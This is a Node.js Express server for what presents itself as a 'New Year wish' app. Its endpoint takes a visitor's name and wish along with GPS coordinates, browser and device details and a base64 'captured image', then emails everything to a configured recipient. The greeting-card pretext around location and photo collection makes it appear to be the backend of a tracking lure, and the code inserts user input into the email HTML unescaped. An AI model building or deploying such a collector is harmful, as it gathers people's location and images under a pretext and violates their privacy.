require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(cors({
    origin: process.env.FRONTEND_URL || 'http://localhost:5500',
}));

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
    },
});

app.post('/send-email', (req, res) => {
    const { name, wish, deviceInfo, imageCaptured } = req.body;

    console.log("Received request body:", req.body);
    console.log("Received device info:", deviceInfo); // Log deviceInfo directly

    let locationText = 'Device information not provided.';
    if (deviceInfo && deviceInfo.location) { // Check if deviceInfo exists AND has location
        locationText = `Location: Latitude: ${deviceInfo.location.latitude}, Longitude: ${deviceInfo.location.longitude}`;
    } else if (deviceInfo && deviceInfo.locationError) {
        locationText = `Location Error: ${deviceInfo.locationError}`;
    }

    let imageAttachment = null;

    if (imageCaptured) {
        try {
            const parts = imageCaptured.split(';base64,');
            const mimeType = parts[0].split(':')[1];
            const imageData = parts[1];

            if (mimeType && imageData) {
                const imageBuffer = Buffer.from(imageData, 'base64');
                imageAttachment = {
                    filename: `captured_image.${mimeType.split('/')[1]}`,
                    content: imageBuffer,
                    contentType: mimeType,
                };
            } else {
                console.error("Invalid base64 format: Missing mimetype or data");
            }
        } catch (error) {
            console.error("Error processing image:", error);
        }
    }


    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.RECIPIENT_EMAIL,
        subject: `New Year Wish from ${name}`,
        html: `
            <p>Name: ${name}</p>
            <p>Wish: ${wish}</p>
            <p>${locationText}</p>
            ${deviceInfo ? `
            <p>User Agent:${deviceInfo.userAgent}</p>
            <p>Platform: ${deviceInfo.platform}</p>
            <p>Language: ${deviceInfo.language}</p>
            ` : ''}
        `,
        attachments: imageAttachment ? [imageAttachment] : [],
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error(error);
            res.status(500).json({ success: false, message: 'Failed to send email' });
        } else {
            console.log('Email sent: ' + info.response);
            res.json({ success: true, message: 'Email sent successfully' });
        }
    });
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});